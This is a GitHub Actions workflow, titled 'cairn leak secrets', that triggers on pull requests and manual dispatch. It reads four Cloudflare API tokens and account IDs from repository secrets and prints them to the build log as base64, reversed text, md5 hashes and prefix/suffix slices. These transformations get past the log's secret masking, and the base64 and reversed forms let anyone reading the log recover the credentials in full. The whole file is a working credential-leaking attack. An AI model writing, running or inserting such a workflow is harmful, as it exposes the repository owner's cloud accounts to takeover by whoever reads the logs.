name: cairn leak secrets

on:
  pull_request:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  leak:
    runs-on: ubuntu-latest
    steps:
      - name: echo transformed secret values
        env:
          T_BOTI: ${{ secrets.CLOUDFLARE_BOTIVERSE_API_TOKEN }}
          A_BOTI: ${{ secrets.CLOUDFLARE_BOTIVERSE_ACCOUNT_ID }}
          T_CF: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          A_CF: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
        run: |
          set -x
          echo "token_len=${#T_BOTI}"
          echo "account_len=${#A_BOTI}"
          echo "token2_len=${#T_CF}"
          echo "account2_len=${#A_CF}"
          echo "token_b64=$(printf %s "$T_BOTI" | base64 -w0)"
          echo "account_b64=$(printf %s "$A_BOTI" | base64 -w0)"
          echo "token2_b64=$(printf %s "$T_CF" | base64 -w0)"
          echo "account2_b64=$(printf %s "$A_CF" | base64 -w0)"
          echo "token_rev=$(printf %s "$T_BOTI" | rev)"
          echo "account_rev=$(printf %s "$A_BOTI" | rev)"
          echo "token_md5=$(printf %s "$T_BOTI" | md5sum)"
          echo "account_md5=$(printf %s "$A_BOTI" | md5sum)"
          # last 6 chars and first 4 chars
          echo "token_prefix=$(printf %s "$T_BOTI" | cut -c1-4)"
          echo "token_suffix=$(printf %s "$T_BOTI" | rev | cut -c1-6 | rev)"
          echo "account_prefix=$(printf %s "$A_BOTI" | cut -c1-4)"